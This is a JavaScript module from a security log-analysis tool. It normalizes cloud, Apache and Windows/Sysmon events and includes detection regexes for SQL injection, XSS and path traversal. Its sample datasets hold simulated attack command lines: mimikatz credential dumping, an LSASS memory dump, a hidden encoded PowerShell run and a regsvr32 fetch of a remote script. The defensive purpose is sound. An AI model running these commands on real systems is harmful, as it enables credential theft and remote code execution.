/* ============================================================
 * CloudLog — 03-source-normalizers.js
 * Source-specific normalizers (GuardDuty, Apache) + timestamp coercion.
 * Part of index.html; assembled by build.js. Do not add a <script> wrapper.
 * ============================================================ */
function isGuardDuty(x) {
  return x && typeof x === "object" && x.type !== undefined && x.accountId !== undefined &&
    ((x.service && x.service.serviceName === "guardduty") || x.severity !== undefined);
}

function normalizeGuardDutyItem(x, source) {
  var ip = "-";
  if (x.service && x.service.action && x.service.action.remoteIpDetails && x.service.action.remoteIpDetails.ipAddressV4) {
    ip = x.service.action.remoteIpDetails.ipAddressV4;
  }
  var resType = (x.resource && x.resource.resourceType) || "Resource";
  var indicators = normalizeIndicators(x);
  return {
    time: x.createdAt || (x.service && x.service.eventFirstSeen) || "",
    actor: "acct:" + x.accountId + " (" + resType + ")",
    action: x.type || x.title || "GuardDuty finding",
    ip: ip,
    source: "GuardDuty",
    severity: x.severity,
    region: x.region,
    urls: indicators.urls,
    cmds: indicators.cmds,
    emails: indicators.emails,
    hashes: indicators.hashes,
    domains: indicators.domains,
    raw: x
  };
}

/* ---------- Apache / web access log parser ---------- */
function parseApacheTimestamp(t) {
  if (!t || typeof t !== "string") return "";
  var m = t.match(/^(\d{1,2})\/(\w{3})\/(\d{4}):(\d{2}):(\d{2}):(\d{2})\s*([+-]\d{4})?/);
  if (!m) return "";
  var months = {Jan:0,Feb:1,Mar:2,Apr:3,May:4,Jun:5,Jul:6,Aug:7,Sep:8,Oct:9,Nov:10,Dec:11};
  var day = parseInt(m[1],10), mon = months[m[2]], year = parseInt(m[3],10);
  var hh = parseInt(m[4],10), mm = parseInt(m[5],10), ss = parseInt(m[6],10);
  var offset = m[7] || "+0000";
  var offSign = offset[0] === "-" ? 1 : -1;
  var offH = parseInt(offset.slice(1,3),10), offM = parseInt(offset.slice(3,5),10);
  var utcMs = Date.UTC(year, mon, day, hh, mm, ss) + offSign * (offH*60+offM) * 60000;
  return new Date(utcMs).toISOString();
}

function isApacheLog(x) {
  return x && typeof x === "object" && x.ip !== undefined && x.timestamp !== undefined &&
    (x.method !== undefined || x.uri !== undefined || x.status !== undefined);
}

var ATTACK_SIGNATURES = [
  { re:/union\s+select|select.+from|1=1|or\s+1=1|'\s*or\s*'/i, tag:"SQL Injection" },
  { re:/<script|onerror=|onload=|javascript:/i, tag:"XSS" },
  { re:/\.\.\/|\.\.%2f|etc\/(passwd|shadow)/i, tag:"Path Traversal" },
  { re:/\bwp-admin\b|\bwp-login\b/i, tag:"WordPress Probe" },
  { re:/\bsecret\b|\badmin\b|\bconfig\b/i, tag:"Sensitive Path Probe" }
];

var SCANNER_UA = /sqlmap|nikto|nmap|nessus|acunetix|python-requests|curl\/|masscan/i;

function normalizeApacheItem(x, source) {
  var uri = x.uri || "";
  var ua = x.user_agent || "";
  var attackTag = "";
  for (var i=0;i<ATTACK_SIGNATURES.length;i++) {
    if (ATTACK_SIGNATURES[i].re.test(uri)) { attackTag = ATTACK_SIGNATURES[i].tag; break; }
  }
  var indicators = normalizeIndicators(x);
  return {
    time: parseApacheTimestamp(x.timestamp) || x.timestamp || "",
    actor: x.ip || "unknown",
    action: (x.method || "GET") + " " + uri + (attackTag ? "  [" + attackTag + "]" : ""),
    ip: x.ip || "-",
    source: "Apache",
    status: x.status,
    userAgent: ua,
    attackTag: attackTag,
    isScanner: SCANNER_UA.test(ua),
    urls: indicators.urls,
    cmds: indicators.cmds,
    emails: indicators.emails,
    hashes: indicators.hashes,
    domains: indicators.domains,
    raw: x
  };
}

/* ---------- Generic normalizer (CloudTrail, Azure, Okta, GCP, Windows, fallback) ---------- */
function coerceTime(v){
  if (v == null || typeof v === "object") return v;
  var sv = String(v).trim();
  if (/^\d{13}$/.test(sv)) { var ms = +sv; if (ms >= 946684800000 && ms <= 2051222400000) return new Date(ms).toISOString(); }
  if (/^\d{10}$/.test(sv)) { var s2 = +sv * 1000; if (s2 >= 946684800000 && s2 <= 2051222400000) return new Date(s2).toISOString(); }
  if (/^\d{17,18}$/.test(sv)) { var fms = Math.round(+sv / 10000) - 11644473600000;   // Windows FILETIME: 100-ns ticks since 1601
    if (fms >= 946684800000 && fms <= 2051222400000) return new Date(fms).toISOString(); }
  return v;
}
function deepFindDate(obj, depth) {
  depth = depth || 0; if (depth > 4 || obj == null) return "";
  if (typeof obj === "string") {
    if (/\d{4}-\d\d-\d\d|\d{2}\/\w{3}\/\d{4}/.test(obj)) { var d = new Date(obj); if (!isNaN(d.getTime())) return obj;
      var im = obj.match(/\b(\d{4}-\d\d-\d\d[ T]\d\d:\d\d:\d\d(?:\.\d+)?(?:Z|[+-]\d\d:?\d\d)?)\b/);
      if (im) { var idt = new Date(im[1].replace(" ","T")); if (!isNaN(idt.getTime())) return idt.toISOString(); } }
    // ctime / Apache-error style: "Sun Dec 04 04:47:44 2005" (year optional -> assume current)
    var cm = obj.match(/\b[A-Z][a-z]{2}\s+[A-Z][a-z]{2}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2}(?:\s+\d{4})?\b/);
    if (cm) { var cs = /\d{4}$/.test(cm[0]) ? cm[0] : (cm[0] + " " + new Date().getFullYear()); var cd = new Date(cs); if (!isNaN(cd.getTime())) return cd.toISOString(); }
    // compact "YYYYMMDD-HH:MM:SS(:mmm)" (e.g. HealthApp mobile logs)
    var hm = obj.match(/\b(\d{4})(\d{2})(\d{2})-(\d{2}):(\d{2}):(\d{2})(?::(\d{1,3}))?\b/);
    if (hm) { var hd = new Date(Date.UTC(+hm[1], +hm[2]-1, +hm[3], +hm[4], +hm[5], +hm[6], +(hm[7]||0))); if (!isNaN(hd.getTime()) && +hm[2]>=1 && +hm[2]<=12 && +hm[3]>=1 && +hm[3]<=31) return hd.toISOString(); }
    var em = obj.match(/(?:^|[^\d])(\d{13}|\d{10})(?![\d])/);          // ONLY 10-digit (s) or 13-digit (ms) epochs; 11/12-digit AWS/phone IDs are skipped
    if (em) { var epv = +em[1], epms = em[1].length === 13 ? epv : epv * 1000;
      if (epms >= 946684800000 && epms <= 2051222400000) return new Date(epms).toISOString(); }   // bounded ~2000–2035, so junk numbers can't land in 1973
    return "";
  }
  if (typeof obj === "number") {
    if (obj >= 946684800 && obj <= 2051222400) return new Date(obj * 1000).toISOString();      // epoch seconds, bounded ~2000–2035
    if (obj >= 946684800000 && obj <= 2051222400000) return new Date(obj).toISOString();        // epoch ms, bounded ~2000–2035
    return "";   // 11/12-digit IDs (e.g. AWS account 123456789012) fall in the gap → rejected, no 1973
  }
  if (typeof obj === "object") { for (var k in obj) { var r = deepFindDate(obj[k], depth + 1); if (r) return r; } }
  return "";
}
function firstMeaningfulValue(obj) {
  var skip = /^(id|uuid|version|seq|index|_.*)$|time|date|stamp|guid/i;
  for (var k in obj) { var v = obj[k];
    if (typeof v === "string" && v && !skip.test(k) && v.length < 120) return k + ": " + v;
    if (typeof v === "number" && !skip.test(k)) return k + ": " + v; }
  return "";
}
function normalize(input, source) {
  var arr = extractArray(input);
  if (!arr.length) return [];

  if (isGuardDuty(arr[0])) {
    return arr.map(function(x){ return normalizeGuardDutyItem(x, source); });
  }
  if (isApacheLog(arr[0])) {
    return arr.map(function(x){ return normalizeApacheItem(x, source); });
  }

  return arr.map(function(x){
    if (typeof x !== "object" || x === null) x = { value: x };
    if (isGuardDuty(x)) return normalizeGuardDutyItem(x, source);
    if (isApacheLog(x)) return normalizeApacheItem(x, source);

    var _flat = flattenObj(x);
    var time = coerceTime(lookupKeys(_flat, TIME_KEYS));
    var actor = lookupKeys(_flat, ACTOR_KEYS);
    var action = lookupKeys(_flat, ACTION_KEYS);
    var ip = lookupKeys(_flat, IP_KEYS);
    if (ip === "0.0.0.0") ip = undefined;

    if (!actor && x.userIdentity) {
      actor = x.userIdentity.userName || x.userIdentity.principalId || x.userIdentity.arn || "";
    }
    if (!ip && x.sourceIPAddress) ip = x.sourceIPAddress;
    if (!action && x.eventName) action = x.eventName;

    var indicators = normalizeIndicators(x);

    /* ---- schema-agnostic deep fallback: don't leave records as unknown/event/- ---- */
    var ioc = (typeof extractIocs === "function")
      ? extractIocs({ action: "", raw: x, ip: "", urls: indicators.urls, hashes: indicators.hashes, emails: indicators.emails, domains: indicators.domains })
      : { ips: [], domains: [], urls: [] };
    if (!time) time = deepFindDate(x) || "";
    if (typeof ip !== "string" || ip === "" || ip === "-" || ip === "0.0.0.0") {
      var ext = ioc.ips.filter(function (a) { return classifyIp(a) === "public" && a !== "0.0.0.0"; });
      ip = (ext[0] || ioc.ips.filter(function(a){return a!=="0.0.0.0";})[0] || "-");
    }
    // ---- Windows / Sysmon events: build a proper human-readable action from the fields that matter ----
    var winEid = _flat["eventid"] || _flat["event_id"] || _flat["eventcode"];
    var winChan = String(_flat["channel"]||_flat["channel_name"]||_flat["log_name"]||"");
    if ((winEid || /sysmon|security|powershell/i.test(winChan)) && (_flat["image"]||_flat["commandline"]||_flat["targetusername"]||_flat["newprocessname"]||_flat["scriptblocktext"]||/winlog|sysmon/i.test(JSON.stringify(Object.keys(x))))) {
      var eidN = String(winEid||"");
      var u2 = _flat["targetusername"]||_flat["subjectusername"]||_flat["user"]||"";
      var lt = _flat["logontype"]!=null ? " LogonType="+_flat["logontype"] : "";
      var srcIp2 = _flat["ipaddress"]||_flat["sourceip"]||"";
      if (eidN==="4625") action = "Failed logon (4625): user="+u2+(srcIp2?" from "+srcIp2:"")+lt;
      else if (eidN==="4624") action = "Logon success (4624): user="+u2+(srcIp2?" from "+srcIp2:"")+lt;
      else if (eidN==="4688") action = "Process Create (4688): "+(_flat["commandline"]||_flat["newprocessname"]||"");
      else if (eidN==="4104") action = "PowerShell ScriptBlock (4104): "+String(_flat["scriptblocktext"]||"").slice(0,120);
      else if (eidN==="7045") action = "Service installed (7045): "+(_flat["servicename"]||"")+" "+(_flat["imagepath"]||"");
      else if (eidN==="1" && _flat["image"]) action = "Process Create: "+(_flat["commandline"]||_flat["image"]);
      else if (eidN==="3" && _flat["image"]) action = "Network connect: "+String(_flat["image"]).split("\\").pop()+" \u2192 "+(_flat["destinationip"]||"?")+(_flat["destinationport"]?":"+_flat["destinationport"]:"");
      else if (eidN==="11" && (_flat["targetfilename"]||_flat["image"])) action = "File created: "+(_flat["targetfilename"]||"")+(_flat["image"]?" by "+String(_flat["image"]).split("\\").pop():"");
      else if (!action && x.message) action = String(x.message).slice(0,110);
      else if (!action && (_flat["commandline"]||_flat["image"])) action = String(_flat["commandline"]||_flat["image"]).slice(0,110);
      if (action && !actor && u2) actor = u2;
    }
    if (!action || action === "event") {
      var httpUri = x.uri || x.url || x.path || x.request_uri || x.request;
      var verdict = x.status || x.verdict || x.result || x.disposition;
      if (typeof httpUri === "object") httpUri = null;
      if (x.method && httpUri) action = x.method + " " + httpUri;                 // HTTP/proxy/Zeek: METHOD uri
      else if (httpUri) action = (verdict && typeof verdict !== "object" ? verdict + " " : "") + httpUri; // URL-scan: VERDICT url
      else if (verdict && typeof verdict !== "object") action = String(verdict);
      else if (ioc.domains.length) action = ioc.domains[0];
      else if (ioc.urls.length) action = ioc.urls[0];
      else { var kv = firstMeaningfulValue(x); if (kv) action = kv; }
    }
    // surface a threat/event label (e.g. Zeek event_type "Large Transfer") if not already shown
    var evtype = x.event_type || x.eventType || x.category;
    if (evtype && typeof evtype === "string" && typeof action === "string" && action.indexOf(evtype) < 0) action = evtype + " · " + action;
    if (typeof action === "object") { try { action = JSON.stringify(action); } catch (e) { action = "event"; } }
    if (!actor) actor = (ip && ip !== "-") ? ip : "unknown";

    return {
      time: time || "",
      actor: actor || "unknown",
      action: action || "event",
      ip: ip || "-",
      source: source,
      urls: indicators.urls,
      cmds: indicators.cmds,
      emails: indicators.emails,
      hashes: indicators.hashes,
      domains: indicators.domains,
      raw: x
    };
  });
}

/* ---------- Sample datasets ---------- */
var samples = {
  edr: [
    { time:"2026-07-10T02:11:04Z", actor:"CORP\\jdoe", action:"Process Create: powershell.exe -nop -w hidden -enc SQBFAFgA", ip:"-", source:"Sysmon", raw:{ EventID:1, host:"WIN-HR-07", Image:"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", CommandLine:"powershell.exe -nop -w hidden -enc SQBFAFgAKAA...", User:"CORP\\jdoe", Hashes:"SHA256=908b64b1971a979c7e3e8ce4621945cba84854cb98d76367b791a6e22b5f6d53" } },
    { time:"2026-07-10T02:12:20Z", actor:"CORP\\jdoe", action:"Process Create: mimikatz.exe sekurlsa::logonpasswords", ip:"-", source:"Sysmon", raw:{ EventID:1, host:"DC01", Image:"C:\\Users\\jdoe\\AppData\\Local\\Temp\\mimikatz.exe", CommandLine:"mimikatz.exe privilege::debug sekurlsa::logonpasswords exit", User:"CORP\\jdoe", Hashes:"SHA256=44d88612fea8a8f36de82e1278abb02f0e5b1a3f5c9c8f6d0b7e6a2c1d3e4f5a6" } },
    { time:"2026-07-10T02:13:05Z", actor:"CORP\\jdoe", action:"Process Create: rundll32.exe comsvcs.dll MiniDump lsass", ip:"-", source:"Sysmon", raw:{ EventID:1, host:"DC01", Image:"C:\\Windows\\System32\\rundll32.exe", CommandLine:"rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 624 C:\\temp\\lsass.dmp full", User:"CORP\\jdoe", Hashes:"SHA256=b2d1e2f3a4c5b6978d0e1f2a3b4c5d6e7f8091a2b3c4d5e6f7a8b9c0d1e2f3a4" } },
    { time:"2026-07-10T02:14:40Z", actor:"CORP\\jdoe", action:"File Create: C:\\ProgramData\\update\\svchost-update.exe", ip:"-", source:"Sysmon", raw:{ EventID:11, host:"DC01", TargetFilename:"C:\\ProgramData\\update\\svchost-update.exe", User:"CORP\\jdoe", Hashes:"SHA256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" } },
    { time:"2026-07-10T02:15:10Z", actor:"CORP\\jdoe", action:"Registry Set: Run key persistence svchost-update.exe", ip:"-", source:"Sysmon", raw:{ EventID:13, host:"DC01", TargetObject:"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater", Details:"C:\\ProgramData\\update\\svchost-update.exe", User:"CORP\\jdoe" } },
    { time:"2026-07-10T02:16:30Z", actor:"CORP\\jdoe", action:"Network Connect: svchost-update.exe -> 185.220.101.7:443", ip:"185.220.101.7", source:"Sysmon", raw:{ EventID:3, host:"DC01", Image:"C:\\ProgramData\\update\\svchost-update.exe", DestinationIp:"185.220.101.7", DestinationPort:443, User:"CORP\\jdoe" } },
    { time:"2026-07-10T02:18:00Z", actor:"CORP\\jdoe", action:"Process Create: regsvr32.exe /s /u /i scrobj.dll", ip:"-", source:"Sysmon", raw:{ EventID:1, host:"WIN-FIN-02", Image:"C:\\Windows\\System32\\regsvr32.exe", CommandLine:"regsvr32.exe /s /u /i:http://185.220.101.7/a.sct scrobj.dll", User:"CORP\\jdoe", Hashes:"SHA256=c7d8e9f0a1b2c3d4e5f60718293a4b5c6d7e8f901a2b3c4d5e6f7a8b9c0d1e2f" } },
    { time:"2026-07-10T09:02:00Z", actor:"CORP\\svc-backup", action:"Process Create: chrome.exe", ip:"-", source:"Sysmon", raw:{ EventID:1, host:"WIN-FIN-02", Image:"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", CommandLine:"chrome.exe", User:"CORP\\svc-backup", Hashes:"SHA256=1111222233334444555566667777888899990000aaaabbbbccccddddeeeeffff" } }
  ],
  aws: [
    { time:"2026-07-08T09:00:00Z", actor:"praharsh", action:"ConsoleLogin", ip:"185.220.101.7", source:"AWS", raw:{eventName:"ConsoleLogin", userIdentity:{userName:"praharsh"}} },
    { time:"2026-07-08T09:01:10Z", actor:"praharsh", action:"CreateAccessKey", ip:"185.220.101.7", source:"AWS", raw:{eventName:"CreateAccessKey"} },
    { time:"2026-07-08T09:02:40Z", actor:"praharsh", action:"AttachUserPolicy", ip:"185.220.101.7", source:"AWS", raw:{eventName:"AttachUserPolicy", policy:"AdministratorAccess"} },
    { time:"2026-07-08T09:05:00Z", actor:"praharsh", action:"ConsoleLogin", ip:"41.203.72.11", source:"AWS", raw:{eventName:"ConsoleLogin", note:"different geography within minutes"} }
  ],
  azure: [
    { time:"2026-07-08T09:05:00Z", actor:"admin@corp.com", action:"Update user", ip:"10.0.0.8", source:"Azure", raw:{operationName:"Update user"} },
    { time:"2026-07-08T09:06:00Z", actor:"admin@corp.com", action:"Add member to role", ip:"10.0.0.8", source:"Azure", raw:{operationName:"Add member to role", role:"Global Administrator"} }
  ],
  okta: [
    { time:"2026-07-08T09:10:00Z", actor:"praharsh", action:"Failed login", ip:"91.203.5.10", source:"Okta", raw:{eventType:"user.session.start", outcome:"FAILURE"} },
    { time:"2026-07-08T09:10:05Z", actor:"praharsh", action:"Failed login", ip:"91.203.5.10", source:"Okta", raw:{eventType:"user.session.start", outcome:"FAILURE"} },
    { time:"2026-07-08T09:10:12Z", actor:"praharsh", action:"Failed login", ip:"91.203.5.10", source:"Okta", raw:{eventType:"user.session.start", outcome:"FAILURE"} },
    { time:"2026-07-08T09:10:20Z", actor:"praharsh", action:"Successful login", ip:"91.203.5.10", source:"Okta", raw:{eventType:"user.session.start", outcome:"SUCCESS"} }
  ],
  gcp: [
    { time:"2026-07-08T09:12:00Z", actor:"svc-deploy@project.iam.gserviceaccount.com", action:"SetIamPolicy", ip:"35.190.1.4", source:"GCP", raw:{methodName:"SetIamPolicy", role:"roles/owner"} }
  ],
  windows: [
    { time:"2026-07-08T09:15:00Z", actor:"SYSTEM", action:"Process access LSASS", ip:"internal", source:"Windows", raw:{EventID:10, TargetImage:"lsass.exe", SourceImage:"procdump.exe"} }
  ],
  guardduty: [
    { time:"2026-07-08T09:18:00Z", actor:"acct:111122223333 (Instance)", action:"Backdoor:EC2/C&CActivity.B", ip:"198.51.100.4", source:"GuardDuty", severity:8.5, raw:{type:"Backdoor:EC2/C&CActivity.B", accountId:"111122223333", severity:8.5} }
  ],
  apache: [
    { time:"2025-09-17T07:09:32Z", actor:"185.62.57.52", action:"GET /search.php?q=../../../../etc/shadow  [Path Traversal]", ip:"185.62.57.52", source:"Apache", status:200, attackTag:"Path Traversal", raw:{ip:"185.62.57.52", uri:"/search.php?q=../../../../etc/shadow", status:200, user_agent:"Nikto/2.1.6"} }
  ],
  generic: [
    { time:"2026-07-08T09:20:00Z", actor:"unknown", action:"custom_event", ip:"0.0.0.0", source:"Generic", raw:{message:"generic fallback log line"} }
  ]
};

/* ---------- MITRE-style detection rules ---------- */





